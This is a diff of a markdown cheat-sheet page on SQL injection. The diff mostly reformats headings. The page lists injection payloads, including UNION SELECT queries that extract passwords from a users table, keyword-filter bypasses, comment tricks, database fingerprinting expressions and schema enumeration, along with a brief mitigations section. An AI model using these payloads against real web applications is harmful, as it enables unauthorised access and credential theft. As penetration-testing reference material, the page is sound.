@@ -3,16 +3,17 @@ layout: page
 title:  "SQL injections"
 permalink: "sql-injections.html"
 tags: [security, injections, web]
+summary: ""
 ---
-# SQL memo
-## Data types
+## SQL memo
+### Data types
 * **INT**: signed integer on 4 bytes
 * **DATE** and **TIME**: self-explanatory. Moron.
 * **VARCHAR**: strings
 * **BLOB** and **TEXT**: binary object of big size
 * **ENUM** and **SET**: string in a list
 
-## Commands
+### Commands
 {% highlight sql %}
 SHOW databases;
 CREATE database database_name;
@@ -29,7 +30,7 @@ DROP TABLE users;
 
 
 
-# Simple injections
+## Simple injections
 * `'`, `''` (SQL-escaped single quote)
 * `test' OR 1=1 --`
 * `UNION SELECT login, password FROM users #`
@@ -42,13 +43,13 @@ DROP TABLE users;
 * `' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --`
 
 
-# Mitigations
+## Mitigations
 * PHP `htmlentities()`
 * PHP `addslashes()`. Can be bypassed if another encoding is used.
 
 
 
-# Strategies
+## Strategies
 * Get the version string of the database
 * Use string concatenation techniques to produce legitimate input
 * MySQL ~ Sybase
@@ -58,12 +59,12 @@ DROP TABLE users;
 
 
 
-# Tactics
+## Tactics
 * URL-encode HTTP-related characters
 * Oracle globally accessible table: `DUAL`. Useful to complete **SELECT** statements
 * Return strings through numeric columns: `ASCII` and `SUBSTRING` functions to return one character at a time
 
-## SELECT filtering bypasses
+### SELECT filtering bypasses
 ```
 SeLeCt
 %00SELECT
@@ -73,11 +74,11 @@ SESELECTLECT
 SE/*MySQL only*/LECT
 ```
 
-## Comments as spaces
+### Comments as spaces
 * `SELECT/*foo*/password/*bar*/FROM/*foobar*/users`
 * MySQL: comments inside keywords `SE/*damn!*/LECT/*foo*/password/*bar*/FROM/*foobar*/users`
 
-## Database fingerprinting
+### Database fingerprinting
 * Oracle: `BITAND(1,1)-BITAND(1,1)`
 * MS-SQL: `@@PACKED_RECEIVED-@@PACKED_RECEIVED`
 * MySQL: `CONNECTION_ID()-CONNECTION_ID()`
@@ -90,7 +91,7 @@ SE/*MySQL only*/LECT
 * Oracle version string: `' UNION SELECT banner, NULL, NULL FROM v$version--`
 
 
-## String
+### String
 * Concatenation useful to return multiple results when only one **VARCHAR** columns found
 * Oracle concatenation: `'||'test`
 * MS-SQL concatenation: `'+'test`
@@ -99,7 +100,7 @@ SE/*MySQL only*/LECT
 * Build MS-SQL string: `CHAR(97)+CHAR(98)='ab'`
 
 
-## Blind injections
+### Blind injections
 * Table structure with MS-SQL, MySQL, SQLite and Postgresql: `' UNION SELECT table_name,column_name FROM information_schema.columns--`
 * Table structure with MS-SQL: `SELECT table_name+':'+column_name FROM information_schema.columns--`
 * Table structure with MySQL: `SELECT CONCAT(table_name, ':', column_name) FROM information_schema.columns--`
